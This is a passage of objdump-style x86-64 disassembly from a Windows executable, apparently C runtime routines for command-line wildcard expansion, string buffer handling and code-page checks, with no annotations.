   14000810d:	48 8b f1             	mov    %rcx,%rsi
   140008110:	48 85 c9             	test   %rcx,%rcx
   140008113:	75 22                	jne    0x140008137
   140008115:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140008118:	74 0c                	je     0x140008126
   14000811a:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   14000811e:	e8 fd fd ff ff       	call   0x140007f20
   140008123:	88 5f 28             	mov    %bl,0x28(%rdi)
   140008126:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   14000812a:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   14000812e:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   140008132:	e9 22 01 00 00       	jmp    0x140008259
   140008137:	66 39 19             	cmp    %bx,(%rcx)
   14000813a:	75 54                	jne    0x140008190
   14000813c:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   140008140:	75 46                	jne    0x140008188
   140008142:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140008145:	74 0c                	je     0x140008153
   140008147:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   14000814b:	e8 d0 fd ff ff       	call   0x140007f20
   140008150:	88 5f 28             	mov    %bl,0x28(%rdi)
   140008153:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008158:	e8 eb fc ff ff       	call   0x140007e48
   14000815d:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140008161:	48 8b cb             	mov    %rbx,%rcx
   140008164:	48 f7 d8             	neg    %rax
   140008167:	1b d2                	sbb    %edx,%edx
   140008169:	f7 d2                	not    %edx
   14000816b:	83 e2 0c             	and    $0xc,%edx
   14000816e:	0f 94 c1             	sete   %cl
   140008171:	85 d2                	test   %edx,%edx
   140008173:	0f 94 c0             	sete   %al
   140008176:	88 47 28             	mov    %al,0x28(%rdi)
   140008179:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   14000817d:	85 d2                	test   %edx,%edx
   14000817f:	74 07                	je     0x140008188
   140008181:	8b da                	mov    %edx,%ebx
   140008183:	e9 d1 00 00 00       	jmp    0x140008259
   140008188:	48 8b 47 10          	mov    0x10(%rdi),%rax
   14000818c:	88 18                	mov    %bl,(%rax)
   14000818e:	eb 9e                	jmp    0x14000812e
   140008190:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140008195:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140008199:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000819e:	4c 8b c6             	mov    %rsi,%r8
   1400081a1:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400081a5:	33 d2                	xor    %edx,%edx
   1400081a7:	41 8b ce             	mov    %r14d,%ecx
   1400081aa:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400081af:	e8 14 15 00 00       	call   0x1400096c8
   1400081b4:	48 63 e8             	movslq %eax,%rbp
   1400081b7:	85 c0                	test   %eax,%eax
   1400081b9:	75 19                	jne    0x1400081d4
   1400081bb:	ff 15 0f 6f 00 00    	call   *0x6f0f(%rip)        # 0x14000f0d0
   1400081c1:	8b c8                	mov    %eax,%ecx
   1400081c3:	e8 08 f5 ff ff       	call   0x1400076d0
   1400081c8:	e8 73 f5 ff ff       	call   0x140007740
   1400081cd:	8b 18                	mov    (%rax),%ebx
   1400081cf:	e9 85 00 00 00       	jmp    0x140008259
   1400081d4:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400081d8:	48 3b e9             	cmp    %rcx,%rbp
   1400081db:	76 42                	jbe    0x14000821f
   1400081dd:	38 5f 28             	cmp    %bl,0x28(%rdi)
   1400081e0:	74 0c                	je     0x1400081ee
   1400081e2:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   1400081e6:	e8 35 fd ff ff       	call   0x140007f20
   1400081eb:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400081ee:	48 8b cd             	mov    %rbp,%rcx
   1400081f1:	e8 52 fc ff ff       	call   0x140007e48
   1400081f6:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400081fa:	48 8b cb             	mov    %rbx,%rcx
   1400081fd:	48 f7 d8             	neg    %rax
   140008200:	1b d2                	sbb    %edx,%edx
   140008202:	f7 d2                	not    %edx
   140008204:	83 e2 0c             	and    $0xc,%edx
   140008207:	48 0f 44 cd          	cmove  %rbp,%rcx
   14000820b:	85 d2                	test   %edx,%edx
   14000820d:	0f 94 c0             	sete   %al
   140008210:	88 47 28             	mov    %al,0x28(%rdi)
   140008213:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140008217:	85 d2                	test   %edx,%edx
   140008219:	0f 85 62 ff ff ff    	jne    0x140008181
   14000821f:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140008223:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140008227:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000822c:	4c 8b c6             	mov    %rsi,%r8
   14000822f:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140008234:	33 d2                	xor    %edx,%edx
   140008236:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000823a:	41 8b ce             	mov    %r14d,%ecx
   14000823d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008242:	e8 81 14 00 00       	call   0x1400096c8
   140008247:	48 63 c8             	movslq %eax,%rcx
   14000824a:	85 c0                	test   %eax,%eax
   14000824c:	0f 84 69 ff ff ff    	je     0x1400081bb
   140008252:	48 ff c9             	dec    %rcx
   140008255:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   140008259:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000825e:	8b c3                	mov    %ebx,%eax
   140008260:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008265:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000826a:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   14000826f:	48 83 c4 40          	add    $0x40,%rsp
   140008273:	41 5e                	pop    %r14
   140008275:	c3                   	ret
   140008276:	cc                   	int3
   140008277:	cc                   	int3
   140008278:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000827d:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140008282:	55                   	push   %rbp
   140008283:	56                   	push   %rsi
   140008284:	57                   	push   %rdi
   140008285:	41 54                	push   %r12
   140008287:	41 55                	push   %r13
   140008289:	41 56                	push   %r14
   14000828b:	41 57                	push   %r15
   14000828d:	48 8b ec             	mov    %rsp,%rbp
   140008290:	48 83 ec 60          	sub    $0x60,%rsp
   140008294:	33 ff                	xor    %edi,%edi
   140008296:	48 8b d9             	mov    %rcx,%rbx
   140008299:	48 85 d2             	test   %rdx,%rdx
   14000829c:	75 16                	jne    0x1400082b4
   14000829e:	e8 9d f4 ff ff       	call   0x140007740
   1400082a3:	8d 5f 16             	lea    0x16(%rdi),%ebx
   1400082a6:	89 18                	mov    %ebx,(%rax)
   1400082a8:	e8 73 f3 ff ff       	call   0x140007620
   1400082ad:	8b c3                	mov    %ebx,%eax
   1400082af:	e9 a0 01 00 00       	jmp    0x140008454
   1400082b4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400082b7:	48 89 3a             	mov    %rdi,(%rdx)
   1400082ba:	48 8b 01             	mov    (%rcx),%rax
   1400082bd:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   1400082c2:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   1400082c6:	48 85 c0             	test   %rax,%rax
   1400082c9:	74 56                	je     0x140008321
   1400082cb:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   1400082cf:	66 c7 45 50 2a 3f    	movw   $0x3f2a,0x50(%rbp)
   1400082d5:	48 8b c8             	mov    %rax,%rcx
   1400082d8:	40 88 7d 52          	mov    %dil,0x52(%rbp)
   1400082dc:	e8 4f 34 00 00       	call   0x14000b730
   1400082e1:	48 8b 0b             	mov    (%rbx),%rcx
   1400082e4:	48 85 c0             	test   %rax,%rax
   1400082e7:	75 10                	jne    0x1400082f9
   1400082e9:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   1400082ed:	45 33 c0             	xor    %r8d,%r8d
   1400082f0:	33 d2                	xor    %edx,%edx
   1400082f2:	e8 8d 01 00 00       	call   0x140008484
   1400082f7:	eb 0c                	jmp    0x140008305
   1400082f9:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400082fd:	48 8b d0             	mov    %rax,%rdx
   140008300:	e8 07 03 00 00       	call   0x14000860c
   140008305:	8b f0                	mov    %eax,%esi
   140008307:	85 c0                	test   %eax,%eax
   140008309:	75 09                	jne    0x140008314
   14000830b:	48 83 c3 08          	add    $0x8,%rbx
   14000830f:	48 8b 03             	mov    (%rbx),%rax
   140008312:	eb b2                	jmp    0x1400082c6
   140008314:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   140008318:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   14000831c:	e9 f8 00 00 00       	jmp    0x140008419
   140008321:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   140008325:	4c 8b cf             	mov    %rdi,%r9
   140008328:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   14000832c:	49 8b d7             	mov    %r15,%rdx
   14000832f:	49 8b c4             	mov    %r12,%rax
   140008332:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   140008336:	49 2b c7             	sub    %r15,%rax
   140008339:	4c 8b c7             	mov    %rdi,%r8
   14000833c:	4c 8b f0             	mov    %rax,%r14
   14000833f:	49 c1 fe 03          	sar    $0x3,%r14
   140008343:	49 ff c6             	inc    %r14
   140008346:	48 8d 48 07          	lea    0x7(%rax),%rcx
   14000834a:	48 c1 e9 03          	shr    $0x3,%rcx
   14000834e:	4d 3b fc             	cmp    %r12,%r15
   140008351:	48 0f 47 cf          	cmova  %rdi,%rcx
   140008355:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   140008359:	48 85 c9             	test   %rcx,%rcx
   14000835c:	74 25                	je     0x140008383
   14000835e:	4c 8b 12             	mov    (%rdx),%r10
   140008361:	48 8b c6             	mov    %rsi,%rax
   140008364:	48 ff c0             	inc    %rax
   140008367:	41 38 3c 02          	cmp    %dil,(%r10,%rax,1)
   14000836b:	75 f7                	jne    0x140008364
   14000836d:	49 ff c1             	inc    %r9
   140008370:	48 83 c2 08          	add    $0x8,%rdx
   140008374:	4c 03 c8             	add    %rax,%r9
   140008377:	49 ff c0             	inc    %r8
   14000837a:	4c 3b c1             	cmp    %rcx,%r8
   14000837d:	75 df                	jne    0x14000835e
   14000837f:	4c 89 4d 50          	mov    %r9,0x50(%rbp)
   140008383:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140008389:	49 8b d1             	mov    %r9,%rdx
   14000838c:	49 8b ce             	mov    %r14,%rcx
   14000838f:	e8 8c d9 ff ff       	call   0x140005d20
   140008394:	48 8b d8             	mov    %rax,%rbx
   140008397:	48 85 c0             	test   %rax,%rax
   14000839a:	74 76                	je     0x140008412
   14000839c:	4a 8d 14 f0          	lea    (%rax,%r14,8),%rdx
   1400083a0:	4d 8b f7             	mov    %r15,%r14
   1400083a3:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   1400083a7:	48 8b c2             	mov    %rdx,%rax
   1400083aa:	48 89 55 58          	mov    %rdx,0x58(%rbp)
   1400083ae:	4d 3b fc             	cmp    %r12,%r15
   1400083b1:	74 56                	je     0x140008409
   1400083b3:	48 8b cb             	mov    %rbx,%rcx
   1400083b6:	49 2b cf             	sub    %r15,%rcx
   1400083b9:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   1400083bd:	4d 8b 06             	mov    (%r14),%r8
   1400083c0:	4c 8b ee             	mov    %rsi,%r13
   1400083c3:	49 ff c5             	inc    %r13
   1400083c6:	43 38 3c 28          	cmp    %dil,(%r8,%r13,1)
   1400083ca:	75 f7                	jne    0x1400083c3
   1400083cc:	48 2b d0             	sub    %rax,%rdx
   1400083cf:	49 ff c5             	inc    %r13
   1400083d2:	48 03 55 50          	add    0x50(%rbp),%rdx
   1400083d6:	4d 8b cd             	mov    %r13,%r9
   1400083d9:	48 8b c8             	mov    %rax,%rcx
   1400083dc:	e8 cf 31 00 00       	call   0x14000b5b0
   1400083e1:	85 c0                	test   %eax,%eax
   1400083e3:	0f 85 83 00 00 00    	jne    0x14000846c
   1400083e9:	48 8b 45 58          	mov    0x58(%rbp),%rax
   1400083ed:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   1400083f1:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   1400083f5:	4a 89 04 31          	mov    %rax,(%rcx,%r14,1)
   1400083f9:	49 03 c5             	add    %r13,%rax
   1400083fc:	49 83 c6 08          	add    $0x8,%r14
   140008400:	48 89 45 58          	mov    %rax,0x58(%rbp)
   140008404:	4d 3b f4             	cmp    %r12,%r14
   140008407:	75 b4                	jne    0x1400083bd
   140008409:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000840d:	8b f7                	mov    %edi,%esi
   14000840f:	48 89 18             	mov    %rbx,(%rax)
   140008412:	33 c9                	xor    %ecx,%ecx
   140008414:	e8 07 fb ff ff       	call   0x140007f20
   140008419:	49 8b dc             	mov    %r12,%rbx
   14000841c:	4d 8b f7             	mov    %r15,%r14
   14000841f:	49 2b df             	sub    %r15,%rbx
   140008422:	48 83 c3 07          	add    $0x7,%rbx
   140008426:	48 c1 eb 03          	shr    $0x3,%rbx
   14000842a:	4d 3b fc             	cmp    %r12,%r15
   14000842d:	48 0f 47 df          	cmova  %rdi,%rbx
   140008431:	48 85 db             	test   %rbx,%rbx
   140008434:	74 14                	je     0x14000844a
   140008436:	49 8b 0e             	mov    (%r14),%rcx
   140008439:	e8 e2 fa ff ff       	call   0x140007f20
   14000843e:	48 ff c7             	inc    %rdi
   140008441:	4d 8d 76 08          	lea    0x8(%r14),%r14
   140008445:	48 3b fb             	cmp    %rbx,%rdi
   140008448:	75 ec                	jne    0x140008436
   14000844a:	49 8b cf             	mov    %r15,%rcx
   14000844d:	e8 ce fa ff ff       	call   0x140007f20
   140008452:	8b c6                	mov    %esi,%eax
   140008454:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   14000845b:	00 
   14000845c:	48 83 c4 60          	add    $0x60,%rsp
   140008460:	41 5f                	pop    %r15
   140008462:	41 5e                	pop    %r14
   140008464:	41 5d                	pop    %r13
   140008466:	41 5c                	pop    %r12
   140008468:	5f                   	pop    %rdi
   140008469:	5e                   	pop    %rsi
   14000846a:	5d                   	pop    %rbp
   14000846b:	c3                   	ret
   14000846c:	45 33 c9             	xor    %r9d,%r9d
   14000846f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140008474:	45 33 c0             	xor    %r8d,%r8d
   140008477:	33 d2                	xor    %edx,%edx
   140008479:	33 c9                	xor    %ecx,%ecx
   14000847b:	e8 c0 f1 ff ff       	call   0x140007640
   140008480:	cc                   	int3
   140008481:	cc                   	int3
   140008482:	cc                   	int3
   140008483:	cc                   	int3
   140008484:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008489:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000848e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008493:	57                   	push   %rdi
   140008494:	41 54                	push   %r12
   140008496:	41 55                	push   %r13
   140008498:	41 56                	push   %r14
   14000849a:	41 57                	push   %r15
   14000849c:	48 83 ec 30          	sub    $0x30,%rsp
   1400084a0:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   1400084a4:	49 8b f9             	mov    %r9,%rdi
   1400084a7:	33 f6                	xor    %esi,%esi
   1400084a9:	4d 8b f0             	mov    %r8,%r14
   1400084ac:	4c 8b ea             	mov    %rdx,%r13
   1400084af:	4c 8b e1             	mov    %rcx,%r12
   1400084b2:	48 ff c5             	inc    %rbp
   1400084b5:	40 38 34 29          	cmp    %sil,(%rcx,%rbp,1)
   1400084b9:	75 f7                	jne    0x1400084b2
   1400084bb:	ba 01 00 00 00       	mov    $0x1,%edx
   1400084c0:	49 8b c6             	mov    %r14,%rax
   1400084c3:	48 03 ea             	add    %rdx,%rbp
   1400084c6:	48 f7 d0             	not    %rax
   1400084c9:	48 3b e8             	cmp    %rax,%rbp
   1400084cc:	76 20                	jbe    0x1400084ee
   1400084ce:	8d 42 0b             	lea    0xb(%rdx),%eax
   1400084d1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400084d6:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1400084db:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1400084e0:	48 83 c4 30          	add    $0x30,%rsp
   1400084e4:	41 5f                	pop    %r15
   1400084e6:	41 5e                	pop    %r14
   1400084e8:	41 5d                	pop    %r13
   1400084ea:	41 5c                	pop    %r12
   1400084ec:	5f                   	pop    %rdi
   1400084ed:	c3                   	ret
   1400084ee:	4d 8d 78 01          	lea    0x1(%r8),%r15
   1400084f2:	4c 03 fd             	add    %rbp,%r15
   1400084f5:	49 8b cf             	mov    %r15,%rcx
   1400084f8:	e8 ab f9 ff ff       	call   0x140007ea8
   1400084fd:	48 8b d8             	mov    %rax,%rbx
   140008500:	4d 85 f6             	test   %r14,%r14
   140008503:	74 19                	je     0x14000851e
   140008505:	4d 8b ce             	mov    %r14,%r9
   140008508:	4d 8b c5             	mov    %r13,%r8
   14000850b:	49 8b d7             	mov    %r15,%rdx
   14000850e:	48 8b c8             	mov    %rax,%rcx
   140008511:	e8 9a 30 00 00       	call   0x14000b5b0
   140008516:	85 c0                	test   %eax,%eax
   140008518:	0f 85 d8 00 00 00    	jne    0x1400085f6
   14000851e:	4d 2b fe             	sub    %r14,%r15
   140008521:	4a 8d 0c 33          	lea    (%rbx,%r14,1),%rcx
   140008525:	49 8b d7             	mov    %r15,%rdx
   140008528:	4c 8b cd             	mov    %rbp,%r9
   14000852b:	4d 8b c4             	mov    %r12,%r8
   14000852e:	e8 7d 30 00 00       	call   0x14000b5b0
   140008533:	85 c0                	test   %eax,%eax
   140008535:	0f 85 bb 00 00 00    	jne    0x1400085f6
   14000853b:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000853f:	44 8d 78 08          	lea    0x8(%rax),%r15d
   140008543:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   140008547:	49 3b ce             	cmp    %r14,%rcx
   14000854a:	0f 85 9d 00 00 00    	jne    0x1400085ed
   140008550:	48 39 37             	cmp    %rsi,(%rdi)
   140008553:	75 2b                	jne    0x140008580
   140008555:	41 8b d7             	mov    %r15d,%edx
   140008558:	8d 48 04             	lea    0x4(%rax),%ecx
   14000855b:	e8 48 f9 ff ff       	call   0x140007ea8
   140008560:	33 c9                	xor    %ecx,%ecx
   140008562:	48 89 07             	mov    %rax,(%rdi)
   140008565:	e8 b6 f9 ff ff       	call   0x140007f20
   14000856a:	48 8b 0f             	mov    (%rdi),%rcx
   14000856d:	48 85 c9             	test   %rcx,%rcx
   140008570:	74 42                	je     0x1400085b4
   140008572:	48 8d 41 20          	lea    0x20(%rcx),%rax
   140008576:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   14000857a:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000857e:	eb 6d                	jmp    0x1400085ed
   140008580:	4c 2b 37             	sub    (%rdi),%r14
   140008583:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000858a:	ff ff 7f 
   14000858d:	49 c1 fe 03          	sar    $0x3,%r14
   140008591:	4c 3b f0             	cmp    %rax,%r14
   140008594:	77 1e                	ja     0x1400085b4
   140008596:	48 8b 0f             	mov    (%rdi),%rcx
   140008599:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   14000859d:	48 8b d5             	mov    %rbp,%rdx
   1400085a0:	4d 8b c7             	mov    %r15,%r8
   1400085a3:	e8 3c 21 00 00       	call   0x14000a6e4
   1400085a8:	48 85 c0             	test   %rax,%rax
   1400085ab:	75 22                	jne    0x1400085cf
   1400085ad:	33 c9                	xor    %ecx,%ecx
   1400085af:	e8 6c f9 ff ff       	call   0x140007f20
   1400085b4:	48 8b cb             	mov    %rbx,%rcx
   1400085b7:	e8 64 f9 ff ff       	call   0x140007f20
   1400085bc:	be 0c 00 00 00       	mov    $0xc,%esi
   1400085c1:	33 c9                	xor    %ecx,%ecx
   1400085c3:	e8 58 f9 ff ff       	call   0x140007f20
   1400085c8:	8b c6                	mov    %esi,%eax
   1400085ca:	e9 02 ff ff ff       	jmp    0x1400084d1
   1400085cf:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   1400085d3:	48 89 07             	mov    %rax,(%rdi)
   1400085d6:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   1400085da:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   1400085de:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   1400085e2:	33 c9                	xor    %ecx,%ecx
   1400085e4:	e8 37 f9 ff ff       	call   0x140007f20
   1400085e9:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400085ed:	48 89 19             	mov    %rbx,(%rcx)
   1400085f0:	4c 01 7f 08          	add    %r15,0x8(%rdi)
   1400085f4:	eb cb                	jmp    0x1400085c1
   1400085f6:	45 33 c9             	xor    %r9d,%r9d
   1400085f9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400085fe:	45 33 c0             	xor    %r8d,%r8d
   140008601:	33 d2                	xor    %edx,%edx
   140008603:	33 c9                	xor    %ecx,%ecx
   140008605:	e8 36 f0 ff ff       	call   0x140007640
   14000860a:	cc                   	int3
   14000860b:	cc                   	int3
   14000860c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008611:	55                   	push   %rbp
   140008612:	56                   	push   %rsi
   140008613:	57                   	push   %rdi
   140008614:	41 54                	push   %r12
   140008616:	41 55                	push   %r13
   140008618:	41 56                	push   %r14
   14000861a:	41 57                	push   %r15
   14000861c:	48 8d ac 24 d0 fd ff 	lea    -0x230(%rsp),%rbp
   140008623:	ff 
   140008624:	48 81 ec 30 03 00 00 	sub    $0x330,%rsp
   14000862b:	48 8b 05 ce 19 01 00 	mov    0x119ce(%rip),%rax        # 0x14001a000
   140008632:	48 33 c4             	xor    %rsp,%rax
   140008635:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   14000863c:	4d 8b e0             	mov    %r8,%r12
   14000863f:	48 8b f1             	mov    %rcx,%rsi
   140008642:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   140008649:	20 00 00 
   14000864c:	48 3b d1             	cmp    %rcx,%rdx
   14000864f:	74 22                	je     0x140008673
   140008651:	8a 02                	mov    (%rdx),%al
   140008653:	2c 2f                	sub    $0x2f,%al
   140008655:	3c 2d                	cmp    $0x2d,%al
   140008657:	77 0a                	ja     0x140008663
   140008659:	48 0f be c0          	movsbq %al,%rax
   14000865d:	48 0f a3 c3          	bt     %rax,%rbx
   140008661:	72 10                	jb     0x140008673
   140008663:	48 8b ce             	mov    %rsi,%rcx
   140008666:	e8 8d 34 00 00       	call   0x14000baf8
   14000866b:	48 8b d0             	mov    %rax,%rdx
   14000866e:	48 3b c6             	cmp    %rsi,%rax
   140008671:	75 de                	jne    0x140008651
   140008673:	44 8a 02             	mov    (%rdx),%r8b
   140008676:	41 80 f8 3a          	cmp    $0x3a,%r8b
   14000867a:	75 1e                	jne    0x14000869a
   14000867c:	48 8d 46 01          	lea    0x1(%rsi),%rax
   140008680:	48 3b d0             	cmp    %rax,%rdx
   140008683:	74 15                	je     0x14000869a
   140008685:	4d 8b cc             	mov    %r12,%r9
   140008688:	45 33 c0             	xor    %r8d,%r8d
   14000868b:	33 d2                	xor    %edx,%edx
   14000868d:	48 8b ce             	mov    %rsi,%rcx
   140008690:	e8 ef fd ff ff       	call   0x140008484
   140008695:	e9 56 02 00 00       	jmp    0x1400088f0
   14000869a:	41 80 e8 2f          	sub    $0x2f,%r8b
   14000869e:	33 ff                	xor    %edi,%edi
   1400086a0:	41 80 f8 2d          	cmp    $0x2d,%r8b
   1400086a4:	77 0c                	ja     0x1400086b2
   1400086a6:	49 0f be c0          	movsbq %r8b,%rax
   1400086aa:	48 0f a3 c3          	bt     %rax,%rbx
   1400086ae:	b0 01                	mov    $0x1,%al
   1400086b0:	72 03                	jb     0x1400086b5
   1400086b2:	40 8a c7             	mov    %dil,%al
   1400086b5:	48 2b d6             	sub    %rsi,%rdx
   1400086b8:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   1400086bc:	48 ff c2             	inc    %rdx
   1400086bf:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
   1400086c3:	f6 d8                	neg    %al
   1400086c5:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
   1400086c9:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400086ce:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
   1400086d2:	4d 1b ed             	sbb    %r13,%r13
   1400086d5:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   1400086d9:	4c 23 ea             	and    %rdx,%r13
   1400086dc:	40 88 7d c8          	mov    %dil,-0x38(%rbp)
   1400086e0:	33 d2                	xor    %edx,%edx
   1400086e2:	e8 09 d1 ff ff       	call   0x1400057f0
   1400086e7:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400086ec:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   1400086f2:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   1400086f6:	75 18                	jne    0x140008710
   1400086f8:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   1400086fd:	74 0c                	je     0x14000870b
   1400086ff:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140008704:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000870b:	45 8b c7             	mov    %r15d,%r8d
   14000870e:	eb 3a                	jmp    0x14000874a
   140008710:	e8 73 f2 ff ff       	call   0x140007988
   140008715:	85 c0                	test   %eax,%eax
   140008717:	75 1b                	jne    0x140008734
   140008719:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   14000871e:	74 0c                	je     0x14000872c
   140008720:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140008725:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000872c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140008732:	eb 16                	jmp    0x14000874a
   140008734:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   140008739:	74 0c                	je     0x140008747
   14000873b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140008740:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008747:	44 8b c7             	mov    %edi,%r8d
   14000874a:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   14000874e:	48 8b ce             	mov    %rsi,%rcx
   140008751:	e8 1e f8 ff ff       	call   0x140007f74
   140008756:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   14000875a:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   14000875e:	85 c0                	test   %eax,%eax
   140008760:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140008764:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140008769:	48 0f 45 cf          	cmovne %rdi,%rcx
   14000876d:	45 33 c9             	xor    %r9d,%r9d
   140008770:	33 d2                	xor    %edx,%edx
   140008772:	ff 15 08 6c 00 00    	call   *0x6c08(%rip)        # 0x14000f380
   140008778:	48 8b d8             	mov    %rax,%rbx
   14000877b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000877f:	75 17                	jne    0x140008798
   140008781:	4d 8b cc             	mov    %r12,%r9
   140008784:	45 33 c0             	xor    %r8d,%r8d
   140008787:	33 d2                	xor    %edx,%edx
   140008789:	48 8b ce             	mov    %rsi,%rcx
   14000878c:	e8 f3 fc ff ff       	call   0x140008484
   140008791:	8b f8                	mov    %eax,%edi
   140008793:	e9 47 01 00 00       	jmp    0x1400088df
   140008798:	4d 8b 74 24 08       	mov    0x8(%r12),%r14
   14000879d:	4d 2b 34 24          	sub    (%r12),%r14
   1400087a1:	49 c1 fe 03          	sar    $0x3,%r14
   1400087a5:	33 d2                	xor    %edx,%edx
   1400087a7:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400087ac:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400087b1:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   1400087b6:	48 89 7d 80          	mov    %rdi,-0x80(%rbp)
   1400087ba:	48 89 7d 88          	mov    %rdi,-0x78(%rbp)
   1400087be:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   1400087c2:	40 88 7d 98          	mov    %dil,-0x68(%rbp)
   1400087c6:	e8 25 d0 ff ff       	call   0x1400057f0
   1400087cb:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400087d0:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   1400087d4:	75 18                	jne    0x1400087ee
   1400087d6:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   1400087db:	74 0c                	je     0x1400087e9
   1400087dd:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400087e2:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400087e9:	45 8b c7             	mov    %r15d,%r8d
   1400087ec:	eb 3a                	jmp    0x140008828
   1400087ee:	e8 95 f1 ff ff       	call   0x140007988
   1400087f3:	85 c0                	test   %eax,%eax
   1400087f5:	75 1b                	jne    0x140008812
